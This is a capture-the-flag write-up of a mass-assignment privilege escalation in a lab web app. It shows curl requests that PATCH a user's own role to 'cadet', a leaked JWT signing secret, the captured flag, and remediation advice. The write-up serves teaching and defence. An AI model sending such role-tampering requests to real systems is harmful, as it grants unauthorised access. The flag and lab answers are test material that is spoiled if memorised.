# Flag 02 — Mass-assignment privilege escalation

**Flag:** `FLAG{just_p4tch_y0ur_0wn_r0l3_lol}`
**Location:** `/staff` (staff dashboard) — revealed once your own role is raised to `cadet`.
**Severity:** Critical
**Class:** Mass assignment / broken access control — a privilege field accepted from client input.

## Discovery

The staff dashboard refused access with: `Cadet access required. Try PATCH /api/profile with the right fields.` The schema at `/api/docs-internal` (reachable without a staff check) confirmed `role` is a client-writable field:

```
writable_fields: ["first_name","last_name","campus","avatar","role"]
role_values:     ["visitor","student","cadet","staff","god"]
note: "role writable via PATCH /api/profile"
```

## Exploitation

Authenticated as `jdoe` (see Flag 01), PATCH my own profile to raise `role`. A direct jump to `staff` was rejected (`403 role not assignable`), but the adjacent step `student → cadet` was allowed:

```bash
curl -s -i -b jdoe.txt -X PATCH http://TARGET:4942/api/profile \
  -H 'Content-Type: application/json' -d '{"role":"cadet"}'
# 200 OK — role now "cadet"
```

Re-requesting the staff dashboard as `cadet` exposes the flag:

```bash
curl -s -b jdoe.txt http://TARGET:4942/staff | grep -i flag
# FLAG{just_p4tch_y0ur_0wn_r0l3_lol}
```

## Note — why JWT tampering did NOT work here

The session is an HS256 JWT and its secret (`42network`) is leaked in the deploy-log comment, so the token is forgeable. But forging `role:"admin"` in the token did **not** escalate — the server re-reads the role from the database. That hardening is exactly what forces the attacker onto the mass-assignment endpoint instead. (The forgeable secret is still a real finding; log it separately.)

## Impact

Any authenticated user can grant themselves elevated privileges by adding one field to a profile update, bypassing all role gating and reaching staff-only functionality and data.

## Remediation

- Never accept authorisation fields (`role`, `is_admin`, …) from client input. Maintain an explicit allow-list of self-editable fields that excludes privilege attributes.
- Apply role changes only through a separate, authorised admin workflow with server-side checks.
- The `student → staff` block shows partial awareness — but any gap (here, `student → cadet`) is enough; validate the *target* role against the actor's authority, not just the size of the jump.

## In simple terms

The site let you edit your own profile (name, campus, avatar…). The problem: your **rank** was one of the fields you could edit. So we simply told the site "set my rank to cadet" — and it did. That higher rank unlocked the staff page, where the flag was shown.

It's like being handed a form to update your address and noticing you can also tick a box that says "job title: manager." The site should never let you promote yourself. Lesson: your permission level must never be something you can set about yourself.
